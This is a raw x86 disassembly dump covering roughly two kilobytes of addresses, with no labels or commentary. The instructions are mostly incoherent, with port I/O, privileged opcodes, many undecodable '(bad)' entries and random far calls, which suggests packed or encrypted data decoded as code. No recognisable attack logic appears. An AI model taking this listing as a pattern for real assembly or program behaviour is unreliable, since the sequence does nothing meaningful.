  41639c:	jle    0x41640e
  41639e:	dec    esi
  41639f:	mov    edx,0x7aa29693
  4163a4:	push   eax
  4163a5:	or     edi,DWORD PTR [edx-0x486442ef]
  4163ab:	in     eax,dx
  4163ac:	jb     0x4163b9
  4163ae:	mov    DWORD PTR [eax+edi*1+0x3d],ecx
  4163b2:	cmc    
  4163b3:	mov    esp,0xd9a530d
  4163b8:	sbb    bl,bh
  4163ba:	fidiv  DWORD PTR [edi-0x5f51b611]
  4163c0:	loop   0x416383
  4163c2:	mov    esi,0x1f2b7bfc
  4163c7:	lods   al,BYTE PTR ds:[esi]
  4163c8:	push   ds
  4163c9:	pop    edi
  4163ca:	call   0x746a:0x628d2485
  4163d1:	dec    ecx
  4163d2:	dec    ecx
  4163d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163d4:	sub    BYTE PTR ds:0xb9253c8c,0x81
  4163db:	sub    al,0xb2
  4163dd:	mov    bl,0xc1
  4163df:	adc    al,0x17
  4163e1:	mov    dl,0x9e
  4163e3:	inc    eax
  4163e4:	adc    DWORD PTR [esi],0x944323bd
  4163ea:	repz daa 
  4163ec:	test   DWORD PTR [ecx-0x7bae491d],0x8b022aa5
  4163f6:	in     al,dx
  4163f7:	sub    ebp,DWORD PTR [ebp+0x9faa2b5]
  4163fd:	arpl   WORD PTR [ebp+0x75],sp
  416400:	inc    eax
  416401:	xor    al,0x6c
  416403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416404:	xchg   esp,eax
  416405:	je     0x4163d3
  416407:	mov    esp,0xfc88bd63
  41640c:	mov    dl,0x4a
  41640e:	out    dx,eax
  41640f:	or     DWORD PTR [edx+ebp*4+0xb378d7e],esi
  416416:	stc    
  416417:	adc    ch,dl
  416419:	cmp    DWORD PTR es:[eax+0x22],edx
  41641d:	ins    BYTE PTR es:[edi],dx
  41641e:	xchg   ebx,eax
  41641f:	mov    bh,0x47
  416421:	sbb    DWORD PTR [ebp+0x27],eax
  416424:	clc    
  416425:	nop
  416426:	or     ebx,DWORD PTR [ebp-0x3e5bf4be]
  41642c:	inc    ecx
  41642d:	cwde   
  41642e:	adc    al,0x38
  416430:	pop    ebx
  416431:	sbb    BYTE PTR [ebp-0x6566fc8a],al
  416437:	test   eax,0x6a4cde98
  41643c:	adc    al,0xed
  41643e:	(bad)  
  41643f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416440:	mov    ds:0x6f89a54e,eax
  416445:	into   
  416446:	sub    BYTE PTR [edi],0xb2
  416449:	ja     0x416454
  41644b:	xchg   BYTE PTR [ebx+eiz*8+0xbca46b9],dh
  416452:	or     BYTE PTR [eax],bh
  416454:	stos   DWORD PTR es:[edi],eax
  416455:	and    BYTE PTR [edi-0x588fe6d7],0x97
  41645c:	loop   0x4163e9
  41645e:	and    al,bl
  416460:	push   cs
  416461:	gs int 0x40
  416464:	out    0xb,eax
  416466:	icebp  
  416467:	aad    0x56
  416469:	or     eax,0x2dc41593
  41646e:	call   0x8cc3:0xe9ea7398
  416475:	xchg   DWORD PTR [ecx-0x65808363],ecx
  41647b:	cmp    BYTE PTR ds:0xf59e598d,dl
  416481:	inc    edx
  416482:	call   0x1687:0xf1aeca22
  416489:	dec    edi
  41648a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41648b:	add    ebx,0x84a73a70
  416491:	xor    ch,BYTE PTR [esi-0x65ed7e77]
  416497:	sub    eax,0x7ea2aa33
  41649c:	ds push 0x62
  41649f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164a0:	dec    ebx
  4164a1:	iret   
  4164a2:	int    0xbd
  4164a4:	jns    0x416509
  4164a6:	imul   eax,DWORD PTR [edx+esi*4],0x3d
  4164aa:	mov    esp,0x85688f07
  4164af:	loopne 0x4164ed
  4164b1:	or     BYTE PTR [ebx],al
  4164b3:	lds    esp,FWORD PTR [eax+ecx*4]
  4164b6:	les    ebp,FWORD PTR [ecx-0x419eecde]
  4164bc:	mov    dl,0x50
  4164be:	shl    BYTE PTR [ebp-0x4b],1
  4164c1:	lods   al,BYTE PTR ds:[esi]
  4164c2:	xchg   edi,eax
  4164c3:	mov    bl,0xa0
  4164c5:	or     edi,DWORD PTR [ebx]
  4164c7:	cmp    BYTE PTR [ebp-0x13],0x76
  4164cb:	cli    
  4164cc:	sahf   
  4164cd:	and    BYTE PTR [edx],cl
  4164cf:	push   ebp
  4164d0:	mov    bl,0x57
  4164d2:	mov    dl,0xf5
  4164d4:	loop   0x416536
  4164d6:	iret   
  4164d7:	in     eax,dx
  4164d8:	xchg   edx,eax
  4164d9:	pop    eax
  4164da:	(bad)  [edi-0x3ae99cee]
  4164e0:	ins    BYTE PTR es:[edi],dx
  4164e1:	das    
  4164e2:	outs   dx,BYTE PTR ds:[esi]
  4164e3:	ss mov dl,0x97
  4164e6:	mov    al,ds:0xa6f12f4f
  4164eb:	inc    eax
  4164ec:	outs   dx,DWORD PTR ds:[esi]
  4164ed:	icebp  
  4164ee:	and    al,0xa7
  4164f0:	enter  0x6746,0xbc
  4164f4:	mov    al,0x12
  4164f6:	out    dx,al
  4164f7:	mov    dl,0xb2
  4164f9:	mov    esi,0x389d3a75
  4164fe:	push   es
  4164ff:	in     eax,0x87
  416501:	std    
  416502:	dec    ebp
  416503:	dec    edi
  416504:	inc    ebp
  416505:	or     edi,ebp
  416507:	pushf  
  416508:	jbe    0x4164c1
  41650a:	pop    ecx
  41650b:	jmp    0xb188:0xb99a6eb4
  416512:	fild   QWORD PTR [ebp+edx*4+0x6a64df3]
  416519:	popf   
  41651a:	in     al,0x7d
  41651c:	jecxz  0x4164ff
  41651e:	dec    ebx
  41651f:	push   edi
  416520:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416521:	xchg   esi,eax
  416522:	call   0xf591:0x24560314
  416529:	dec    eax
  41652a:	cmc    
  41652b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41652c:	fs in  eax,dx
  41652e:	(bad)  
  41652f:	das    
  416530:	lahf   
  416531:	sti    
  416532:	enter  0xb210,0xcb
  416536:	sub    DWORD PTR [ecx-0x59],edx
  416539:	fisttp WORD PTR [edx]
  41653b:	in     al,dx
  41653c:	call   DWORD PTR ds:0xca71b8bc
  416542:	imul   ebp,DWORD PTR [esi-0x7a],0xffffff9a
  416546:	gs xchg edi,eax
  416548:	mov    dh,0xf6
  41654a:	fwait
  41654b:	mov    ds:0xeda08b2a,eax
  416550:	lods   eax,DWORD PTR ds:[esi]
  416551:	ja     0x41650d
  416553:	and    BYTE PTR [ebp+0xb],ch
  416556:	pop    esp
  416557:	out    dx,al
  416558:	pop    ebp
  416559:	dec    eax
  41655a:	test   BYTE PTR [ecx-0x45669b92],ch
  416560:	int3   
  416561:	push   ds
  416562:	mov    ds:0xb793476d,al
  416567:	mov    BYTE PTR [ebx],cl
  416569:	or     ebp,DWORD PTR [ebx-0x62]
  41656c:	out    0xea,al
  41656e:	out    0x81,al
  416570:	jb     0x41659b
  416572:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416573:	scas   al,BYTE PTR es:[edi]
  416574:	xor    DWORD PTR [ebx+0x346bb73d],ecx
  41657a:	cdq    
  41657b:	inc    ebp
  41657c:	jno    0x41658a
  41657e:	aad    0xa0
  416580:	clc    
  416581:	mov    ebp,0xc4c3c7ef
  416586:	adc    al,0xd5
  416588:	mov    dl,0x94
  41658a:	scas   al,BYTE PTR es:[edi]
  41658b:	mov    ebx,0xff78542a
  416590:	cdq    
  416591:	icebp  
  416592:	loope  0x41653b
  416594:	pop    edx
  416595:	sbb    ecx,DWORD PTR [ecx+0x77]
  416598:	(bad)  
  416599:	outs   dx,DWORD PTR ds:[esi]
  41659a:	in     al,dx
  41659b:	popa   
  41659c:	mov    ebp,0xdc4c8b8b
  4165a1:	les    edx,FWORD PTR [ebx-0x56dd3479]
  4165a7:	pop    ecx
  4165a8:	(bad)  
  4165aa:	adc    ebx,DWORD PTR [edi-0x1bf8dbf9]
  4165b0:	retf   0x574b
  4165b3:	jo     0x416584
  4165b5:	sub    al,0x26
  4165b7:	mov    ?,WORD PTR [edx+0x1e1e1518]
  4165bd:	mov    ebp,0xcc236c5
  4165c2:	sub    DWORD PTR [esi],ecx
  4165c4:	adc    DWORD PTR [ebx-0x385bfb7b],eax
  4165ca:	or     dl,BYTE PTR [ebp+0x419aa0d9]
  4165d0:	push   0x4d
  4165d2:	and    BYTE PTR [ebp-0x57d45290],bl
  4165d8:	ins    BYTE PTR es:[edi],dx
  4165d9:	scas   al,BYTE PTR es:[edi]
  4165da:	adc    DWORD PTR [esi+0x33],0xffffffbe
  4165de:	mov    ds:0xf6b48e3,al
  4165e3:	cmp    BYTE PTR [edx-0x5aba02fe],dh
  4165e9:	dec    eax
  4165ea:	inc    esi
  4165eb:	pop    ebx
  4165ec:	popf   
  4165ed:	or     BYTE PTR [ecx-0x72],ah
  4165f0:	jb     0x4165f1
  4165f2:	add    BYTE PTR [ecx-0x3933cbb6],dh
  4165f8:	mov    ecx,DWORD PTR [ecx+ebx*1-0x3030c059]
  4165ff:	sub    eax,0xa26ddeb7
  416604:	lods   eax,DWORD PTR ds:[esi]
  416605:	and    edi,DWORD PTR [ebp-0x6f]
  416608:	int    0xcb
  41660a:	ins    BYTE PTR es:[edi],dx
  41660b:	sub    BYTE PTR [ebx+eax*4],ah
  41660e:	call   0x7443:0x9cbe722e
  416615:	jmp    0x4165ce
  416617:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416618:	enter  0x4591,0x98
  41661c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41661d:	(bad)  
  41661f:	in     al,dx
  416620:	mov    esp,0xd612be8f
  416625:	stos   DWORD PTR es:[edi],eax
  416626:	cmp    BYTE PTR [ebx-0x58203829],0x89
  41662d:	xor    cl,bl
  41662f:	js     0x4165d1
  416631:	scas   al,BYTE PTR es:[edi]
  416632:	sub    esi,DWORD PTR [eax-0x4e]
  416635:	inc    ebp
  416636:	cli    
  416637:	mov    dl,0xd1
  416639:	inc    eax
  41663a:	lods   al,BYTE PTR es:[esi]
  41663c:	mov    esp,0x1b4c5b23
  416641:	or     ah,ah
  416643:	xor    BYTE PTR [ebp+0x3bc3a4f5],0xcf
  41664a:	fiadd  DWORD PTR [edx+esi*4-0x64a756a5]
  416651:	sbb    al,0xc1
  416653:	test   al,0xcf
  416655:	or     ecx,DWORD PTR ds:0x46581aad
  41665b:	adc    al,0x84
  41665d:	sub    edi,DWORD PTR [esi+0x32]
  416660:	jmp    0x4337:0x3da8233e
  416667:	xchg   DWORD PTR [ebx],esi
  416669:	jbe    0x41664f
  41666b:	push   esi
  41666c:	sbb    eax,0x794ccc0b
  416671:	aam    0x44
  416673:	or     BYTE PTR [ebp+ebx*4+0x63ce109a],0x62
  41667b:	pop    ds
  41667c:	sub    BYTE PTR [eax-0x40ac5ab6],ch
  416682:	dec    ecx
  416683:	int3   
  416684:	mov    DWORD PTR [ecx-0x54d089e6],ebx
  41668a:	mov    bh,BYTE PTR [ebp-0x4e]
  41668d:	jp     0x4166e2
  41668f:	inc    eax
  416690:	icebp  
  416691:	scas   al,BYTE PTR es:[edi]
  416692:	iret   
  416693:	fadd   st,st(1)
  416695:	or     bl,BYTE PTR [edi+0xcd7870d]
  41669b:	adc    DWORD PTR [eax+0x3f0a52f4],0xffffffad
  4166a2:	jecxz  0x41665b
  4166a4:	lods   eax,DWORD PTR ds:[esi]
  4166a5:	add    al,0xb2
  4166a7:	in     al,0xb2
  4166a9:	fbld   TBYTE PTR [ebx+0x51274d82]
  4166af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166b0:	mov    ch,0x17
  4166b2:	mov    ebp,ss
  4166b4:	scas   eax,DWORD PTR es:[edi]
  4166b5:	outs   dx,BYTE PTR ds:[esi]
  4166b6:	in     al,0x53
  4166b8:	mov    ch,0xbe
  4166ba:	dec    eax
  4166bb:	ja     0x4166ae
  4166bd:	les    ebp,FWORD PTR [edx]
  4166bf:	add    al,0x8e
  4166c1:	inc    ebx
  4166c2:	xor    BYTE PTR [esi+eiz*8-0x4dbae457],ch
  4166c9:	pop    es
  4166ca:	ins    DWORD PTR es:[edi],dx
  4166cb:	add    dl,0x26
  4166ce:	call   0xe0c5:0x21b58c10
  4166d5:	pop    es
  4166d6:	mov    ch,0xa7
  4166d8:	test   ebx,0x76d90662
  4166de:	mov    al,ds:0x8c81895d
  4166e3:	jmp    0x416666
  4166e5:	or     bh,bl
  4166e7:	pop    ss
  4166e8:	mov    ebp,0x728c7e85
  4166ed:	cld    
  4166ee:	cdq    
  4166ef:	sar    cl,1
  4166f1:	or     ebx,DWORD PTR [esi*2-0x4e397cf0]
  4166f8:	sti    
  4166f9:	in     eax,dx
  4166fa:	popf   
  4166fb:	jo     0x416721
  4166fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166fe:	addr16 pop ds
  416700:	xchg   ecx,eax
  416701:	int3   
  416702:	clc    
  416703:	pop    ss
  416704:	mov    eax,ds:0xca77445
  416709:	dec    esi
  41670a:	dec    ecx
  41670b:	mov    dl,0x63
  41670d:	pop    ebx
  41670e:	push   ebx
  41670f:	push   ebp
  416710:	scas   al,BYTE PTR es:[edi]
  416711:	hlt    
  416712:	out    0xe4,eax
  416714:	repnz ins BYTE PTR es:[edi],dx
  416716:	xchg   ecx,eax
  416717:	in     al,dx
  416718:	xchg   BYTE PTR [edx+0x591aa79c],ch
  41671e:	pusha  
  41671f:	(bad)  
  416720:	out    0x8e,eax
  416722:	(bad)  
  416723:	loopne 0x4166d7
  416725:	cmc    
  416726:	mov    bh,0xd2
  416728:	pop    eax
  416729:	sbb    bl,BYTE PTR [ebp+0x310b2ae3]
  41672f:	jmp    0x41676e
  416731:	pop    edi
  416732:	cmp    eax,0x99cbe1e5
  416737:	dec    esp
  416738:	cmp    DWORD PTR [ebx-0x2410d495],ebx
  41673e:	mov    DWORD PTR [ebp+ebx*1+0x4],edx
  416742:	add    DWORD PTR [ebp+0xe],0x1729da52
  416749:	jbe    0x4166e9
  41674b:	gs mov dl,0x3a
  41674e:	into   
  41674f:	and    al,ah
  416751:	cmp    BYTE PTR [ebp-0x14facc68],0xff
  416758:	hlt    
  416759:	inc    ebp
  41675a:	jp     0x41672a
  41675c:	mov    BYTE PTR [esi-0x1b],bh
  41675f:	out    0x8d,al
  416761:	sbb    eax,0x5a1d8e38
  416767:	(bad)  
  416768:	shr    BYTE PTR [esi+0xbd9ba53],cl
  41676e:	or     ch,BYTE PTR [eax+0x629d48e5]
  416774:	cli    
  416775:	adc    ebx,DWORD PTR [eax+0x73ad3978]
  41677b:	sub    ebp,DWORD PTR [ebx-0x47cb3f95]
  416781:	or     ebx,DWORD PTR [eax+0x346a782f]
  416787:	clc    
  416788:	jbe    0x416735
  41678a:	js     0x416802
  41678c:	mov    dl,0x1c
  41678e:	ds (bad) 
  416790:	in     eax,0x12
  416792:	push   edx
  416793:	xchg   ebp,eax
  416794:	sti    
  416795:	stc    
  416796:	ret    0xd4a3
  416799:	(bad)  
  41679a:	adc    ch,BYTE PTR gs:[ecx-0x75]
  41679e:	loope  0x4167a9
  4167a0:	and    DWORD PTR [esi-0x65],ebx
  4167a3:	dec    ebx
  4167a4:	shl    DWORD PTR [edi+edi*8+0x4634721b],1
  4167ab:	ficomp DWORD PTR [esi]
  4167ad:	or     ebx,edx
  4167af:	push   ebp
  4167b0:	dec    ecx
  4167b1:	ds aam 0x76
  4167b4:	mov    al,ds:0xb7a19ac3
  4167b9:	jmp    0x4167fd
  4167bb:	test   BYTE PTR [ebp-0x29],ch
  4167be:	sub    esp,DWORD PTR [edi-0x33dc83a6]
  4167c4:	inc    ecx
  4167c5:	xchg   ebx,eax
  4167c6:	ja     0x416751
  4167c8:	(bad)  
  4167c9:	mov    al,ds:0x6fdd059b
  4167ce:	push   ss
  4167cf:	sub    ah,al
  4167d1:	push   0x6a
  4167d3:	cwde   
  4167d4:	xchg   esp,eax
  4167d5:	or     edi,esp
  4167d7:	and    al,0x7d
  4167d9:	pushf  
  4167da:	(bad)  
  4167db:	iret   
  4167dc:	ret    0x9d0a
  4167df:	xor    ah,BYTE PTR [edx-0x1d1ceadc]
  4167e5:	cmp    DWORD PTR [esi+0x690b0adf],ebx
  4167eb:	dec    edx
  4167ec:	out    0x2f,eax
  4167ee:	pop    ebx
  4167ef:	pop    edi
  4167f0:	mov    esi,0xa9739a63
  4167f5:	pop    ss
  4167f6:	push   ebp
  4167f7:	test   al,0x18
  4167f9:	into   
  4167fa:	and    DWORD PTR [edi+0x796ec28f],0xffffffe7
  416801:	jno    0x41679b
  416803:	push   ss
  416804:	inc    ebp
  416805:	(bad)  
  416806:	lods   al,BYTE PTR ds:[esi]
  416807:	dec    esi
  416808:	mov    ebp,0x3ff831e0
  41680d:	push   0xb3d41b24
  416812:	pusha  
  416813:	js     0x41688a
  416815:	or     DWORD PTR [edi-0x52],ecx
  416818:	sub    DWORD PTR [edi-0x62],ecx
  41681b:	mov    bh,0xd2
  41681d:	mov    edi,0x9db21657
  416822:	nop
  416823:	mov    dl,0xae
  416825:	retf   0x1073
  416828:	mov    esi,0x8acddf0c
  41682d:	adc    DWORD PTR [edi],ebp
  41682f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416830:	fwait
  416831:	(bad)  
  416832:	cs loopne 0x4167e7
  416835:	je     0x4167bd
  416837:	sbb    eax,DWORD PTR [ecx+esi*4+0x57]
  41683b:	hlt    
  41683c:	mov    ebx,0x6e2e651c
  416841:	or     al,0x1e
  416843:	imul   ebp,eax,0xffffff9b
  416846:	iret   
  416847:	call   0xe3d66bfc
  41684c:	xchg   BYTE PTR [eax+0x5781a0e6],al
  416852:	dec    edx
  416853:	xlat   BYTE PTR ds:[ebx]
  416854:	cdq    
  416855:	imul   ebp,DWORD PTR [esi+eiz*4+0x21],0xffffffab
  41685a:	(bad)  
  41685c:	push   ds
  41685d:	je     0x416887
  41685f:	dec    edx
  416860:	push   edi
  416861:	call   0x65a608d8
  416866:	call   0x1370:0x4aa16e3f
  41686d:	pop    edx
  41686e:	sbb    eax,0x1bababa
  416873:	out    0x53,eax
  416875:	rcl    edi,0x95
  416878:	pop    es
  416879:	imul   esp,edi,0xfffffff7
  41687c:	mov    dl,0x5e
  41687e:	dec    esp
  41687f:	mov    ebp,0xde6a9e4e
  416884:	or     DWORD PTR [ebx],esi
  416886:	(bad)  [edi+0x8]
  416889:	inc    ecx
  41688a:	retf   0x4470
  41688d:	or     edx,ebx
  41688f:	mov    al,0xc5
  416891:	jp     0x4168da
  416893:	sbb    eax,0xe69a00d3
  416898:	inc    ecx
  416899:	adc    esi,DWORD PTR [ebp-0x4e65ea6a]
  41689f:	(bad)  
  4168a0:	out    0xef,eax
  4168a2:	pop    edi
  4168a3:	or     eax,DWORD PTR [ebx+0x69]
  4168a6:	fwait
  4168a7:	sbb    edi,DWORD PTR [esi+0x58]
  4168aa:	pop    es
  4168ab:	shl    eax,1
  4168ad:	aam    0xba
  4168af:	cmp    edx,edi
  4168b1:	or     ebx,DWORD PTR [esp+ecx*4-0x4c1117d7]
  4168b8:	pop    ds
  4168b9:	xor    bl,BYTE PTR [edx+0x50ec0649]
  4168bf:	daa    
  4168c0:	in     al,0x13
  4168c2:	push   ebx
  4168c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168c4:	aad    0xf1
  4168c6:	stos   BYTE PTR es:[edi],al
  4168c7:	out    dx,al
  4168c8:	or     BYTE PTR [ebx],ah
  4168ca:	sbb    eax,0x642fb23f
  4168cf:	rcr    edx,0x79
  4168d2:	mov    bl,0x86
  4168d4:	cmp    DWORD PTR [ebx+edx*4],ecx
  4168d7:	sbb    DWORD PTR [eax-0x5d],edi
  4168da:	pop    ds
  4168db:	xlat   BYTE PTR ds:[ebx]
  4168dc:	(bad)  
  4168de:	inc    esp
  4168df:	gs mov dl,0x90
  4168e2:	mov    al,ds:0x25cc1730
  4168e7:	(bad)  
  4168e8:	fidiv  DWORD PTR [ebp+0x0]
  4168eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168ec:	push   eax
  4168ed:	aaa    
  4168ee:	ficomp WORD PTR [edx+0x12]
  4168f1:	pop    ecx
  4168f2:	sub    dl,BYTE PTR [edx-0x75bd2245]
  4168f8:	repz add al,0x11
  4168fb:	daa    
  4168fc:	std    
  4168fd:	and    al,0xce
  4168ff:	or     esp,DWORD PTR [eax]
  416901:	or     ebp,DWORD PTR [edx-0x2ba329e7]
  416907:	(bad)  
  416909:	retf   
  41690a:	call   0xe633:0x667e6146
  416911:	sar    dl,0xa7
  416914:	mov    ch,0x2f
  416916:	rol    BYTE PTR [edx+0x6736bc21],0xae
  41691d:	dec    eax
  41691e:	scas   eax,DWORD PTR es:[edi]
  41691f:	mov    cl,0xed
  416921:	ins    BYTE PTR es:[edi],dx
  416922:	sbb    ch,BYTE PTR [ebx-0x13]
  416925:	outs   dx,BYTE PTR ds:[esi]
  416926:	and    al,0x46
  416928:	jl     0x41692e
  41692a:	jne    0x41694d
  41692c:	and    al,0x98
  41692e:	lahf   
  41692f:	dec    ecx
  416930:	in     eax,0xcb
  416932:	dec    ebp
  416933:	les    edx,FWORD PTR [esi+0xc707d2]
  416939:	xchg   ebp,eax
  41693a:	jp     0x4168e2
  41693c:	and    bl,BYTE PTR [edi+0x2b54faef]
  416942:	into   
  416943:	jae    0x41690e
  416945:	popa   
  416946:	call   0x36d3:0x1a484850
  41694d:	pop    ecx
  41694e:	test   eax,0x461b21a7
  416953:	sbb    ebx,ebp
  416955:	fsubr  QWORD PTR [ebx]
  416957:	lods   al,BYTE PTR ds:[esi]
  416958:	mov    bh,0xb1
  41695a:	jecxz  0x41696f
  41695c:	mov    ds,WORD PTR cs:[edx+0x45]
  416960:	(bad)
  416964:	scas   eax,DWORD PTR es:[edi]
  416965:	pop    edx
  416966:	xor    BYTE PTR [edx+0x3c],al
  416969:	pop    esp
  41696a:	jno    0x4169d9
  41696c:	mov    ch,0xbc
  41696e:	fcom   QWORD PTR [edx+ebx*4+0x67]
  416972:	imul   eax,DWORD PTR [ebx+esi*2],0x4a
  416976:	jb     0x4169e6
  416978:	ds or  al,0xa0
  41697b:	xor    dl,BYTE PTR [edi]
  41697d:	retf   
  41697e:	or     ah,BYTE PTR [edi]
  416980:	inc    edx
  416981:	jecxz  0x416919
  416983:	push   ebx
  416984:	inc    esp
  416985:	jno    0x416922
  416987:	jle    0x416961
  416989:	mov    eax,ds:0xb1c7ccad
  41698e:	push   0x67
  416990:	call   0xc9d7:0x22f9830b
  416997:	aam    0x41
  416999:	rcr    BYTE PTR [edx-0xe198216],0x43
  4169a0:	dec    esp
  4169a1:	nop
  4169a2:	in     eax,dx
  4169a3:	test   al,0xb9
  4169a5:	pop    es
  4169a6:	xor    ebx,ecx
  4169a8:	xor    bl,BYTE PTR [esi-0x12]
  4169ab:	sub    BYTE PTR [edx],al
  4169ad:	dec    esi
  4169ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169af:	mov    ah,0x68
  4169b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169b2:	xor    BYTE PTR [eax],bh
  4169b4:	mov    ecx,DWORD PTR [esi+edi*2]
  4169b7:	test   DWORD PTR [esi+0x3e],esi
  4169ba:	pop    ebx
  4169bb:	xchg   esi,eax
  4169bc:	mov    cl,0xde
  4169be:	ficom  DWORD PTR [ebx]
  4169c0:	pop    es
  4169c1:	stos   DWORD PTR es:[edi],eax
  4169c2:	mov    ebx,0xd02c1a4
  4169c7:	fmul   st,st(6)
  4169c9:	gs inc edx
  4169cb:	mov    eax,ds:0x468d2df0
  4169d0:	lods   al,BYTE PTR ds:[esi]
  4169d1:	outs   dx,BYTE PTR ds:[esi]
  4169d2:	call   0x924b:0xfe9b75cd
  4169d9:	or     esi,DWORD PTR [eax-0x3e46cb1f]
  4169df:	ins    DWORD PTR es:[edi],dx
  4169e0:	ins    BYTE PTR es:[edi],dx
  4169e1:	adc    eax,0x97fc2894
  4169e6:	jecxz  0x4169ae
  4169e8:	(bad)  
  4169ea:	cs push es
  4169ec:	inc    ebp
  4169ed:	or     ebp,DWORD PTR [esi+0x1e]
  4169f0:	pop    es
  4169f1:	mov    al,ds:0x2ddca903
  4169f6:	call   0xac69:0x38b9402d
  4169fd:	retf   0xa7da
  416a00:	mov    al,0xbb
  416a02:	mov    DWORD PTR [ecx+eiz*8+0x6e],esi
  416a06:	xor    eax,0x7bc7b1f0
  416a0b:	pop    ds
  416a0c:	mov    ah,0x68
  416a0e:	xchg   esp,eax
  416a0f:	das    
  416a10:	stc    
  416a11:	lea    ecx,ds:0x4e28dda7
  416a17:	xchg   esp,eax
  416a18:	xor    eax,0xb2349635
  416a1d:	jge    0x4169af
  416a1f:	jge    0x416a86
  416a21:	mov    cl,0x2b
  416a23:	lahf   
  416a24:	jp     0x416a31
  416a26:	mov    al,ch
  416a28:	pop    eax
  416a29:	(bad)  
  416a2a:	(bad)  
  416a2b:	in     al,dx
  416a2c:	out    0x9a,eax
  416a2e:	(bad)  
  416a2f:	iret   
  416a30:	mov    dl,0xa3
  416a32:	int    0x5
  416a34:	jge    0x416a30
  416a36:	inc    esi
  416a37:	in     eax,dx
  416a38:	fmul   DWORD PTR [ebx]
  416a3a:	or     esp,0xc
  416a3d:	in     eax,dx
  416a3e:	sub    BYTE PTR [ebp-0x4f66acb3],ah
  416a44:	leave  
  416a45:	popf   
  416a46:	mov    eax,0x73822f1e
  416a4b:	lock dec ebx
  416a4d:	std    
  416a4e:	inc    esi
  416a4f:	mov    ds:0x5ef10b8b,eax
  416a54:	cs inc esp
  416a56:	xor    al,0x49
  416a58:	xor    edx,ebp
  416a5a:	call   0xdab0:0x33a3b970
  416a61:	pop    ds
  416a62:	mov    eax,0x5a0bf4d3
  416a67:	fstp   QWORD PTR [ecx]
  416a69:	adc    BYTE PTR [ebx-0x655002f7],dl
  416a6f:	and    al,0x30
  416a71:	stos   DWORD PTR es:[edi],eax
  416a72:	xchg   ebp,eax
  416a73:	in     eax,0x35
  416a75:	nop
  416a76:	lods   eax,DWORD PTR ds:[esi]
  416a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a79:	jb     0x416a55
  416a7b:	out    dx,al
  416a7c:	es mov dl,0x1b
  416a7f:	ror    esp,0xd
  416a82:	fwait
  416a83:	inc    ecx
  416a84:	push   0x67df00bf
  416a89:	das    
  416a8a:	outs   dx,BYTE PTR ds:[esi]
  416a8b:	jno    0x416a19
  416a8d:	or     ebp,edi
  416a8f:	out    0xc1,eax
  416a91:	leave  
  416a92:	xchg   edx,eax
  416a93:	out    0xae,al
  416a95:	test   al,0x9a
  416a97:	clc    
  416a98:	push   esi
  416a99:	jne    0x416a4d
  416a9b:	mov    bl,0x9d
  416a9d:	(bad)
  416aa0:	pop    DWORD PTR [esi-0x3d]
  416aa3:	sbb    eax,0xa96efc99
  416aa8:	mov    dl,0xe5
  416aaa:	mov    ebp,edi
  416aac:	pop    ss
  416aad:	pusha  
  416aae:	cdq    
  416aaf:	mov    cl,0x66
  416ab1:	or     cl,BYTE PTR [ecx+eax*8]
  416ab4:	in     eax,dx
  416ab5:	dec    ebp
  416ab6:	adc    BYTE PTR [edi+0x6e],bl
  416ab9:	mul    eax
  416abb:	icebp  
  416abc:	dec    edx
  416abd:	sub    DWORD PTR [edx+0x2f789f46],ebx
  416ac3:	inc    ebp
  416ac4:	pop    ecx
  416ac5:	fimul  DWORD PTR [edx]
  416ac7:	push   ebx
  416ac8:	das    
  416ac9:	add    eax,0x2b022428
  416ace:	mov    ecx,0x522f1899
  416ad3:	in     eax,0xae
  416ad5:	aad    0x9a
  416ad7:	add    BYTE PTR [edi+ebx*4],ah
  416ada:	outs   dx,BYTE PTR ds:[esi]
  416adb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416adc:	sub    DWORD PTR [eax-0x73b2f9d6],esp
  416ae2:	jbe    0x416aae
  416ae4:	inc    ecx
  416ae5:	or     esi,DWORD PTR [ebp+0x101766f1]
  416aeb:	sbb    edi,DWORD PTR [ecx+ebp*4]
  416aee:	fwait
  416aef:	int    0x44
  416af1:	jmp    DWORD PTR [esi-0x45963792]
  416af7:	fcom   DWORD PTR [edi]
  416af9:	or     BYTE PTR [esi+0x32],bl
  416afc:	jmp    0x416b58
  416afe:	xchg   BYTE PTR [eax+0x44911f5a],bh
  416b04:	mov    esp,0x5a1be2bb
  416b09:	stos   DWORD PTR es:[edi],eax
  416b0a:	jecxz  0x416ade
  416b0c:	xchg   esi,eax
  416b0d:	sbb    ch,bh
  416b0f:	call   0x820f:0xa4e4db9d
  416b16:	and    ah,0xc4
  416b19:	mov    ds:0xaf6ed31a,eax
  416b1e:	cdq    
  416b1f:	adc    cl,BYTE PTR [edx+0x1e]
  416b22:	cmp    ecx,DWORD PTR [edi+0x64ddb330]
  416b28:	cmp    ecx,DWORD PTR [ebx]
  416b2a:	push   0xba3f361c
  416b2f:	mov    ch,0xe4
  416b31:	in     al,dx
  416b32:	xchg   ebp,eax
  416b33:	rcr    BYTE PTR [ecx-0x9b83ce2],0x98
  416b3a:	or     DWORD PTR [ecx-0x8],0xd99b660b
  416b41:	jnp    0x416b98
  416b43:	sub    bl,bh
  416b45:	mov    ds,WORD PTR [ebx-0x4829f407]
  416b4b:	lods   eax,DWORD PTR ds:[esi]
  416b4c:	fwait
  416b4d:	dec    ebx
  416b4e:	pop    edx
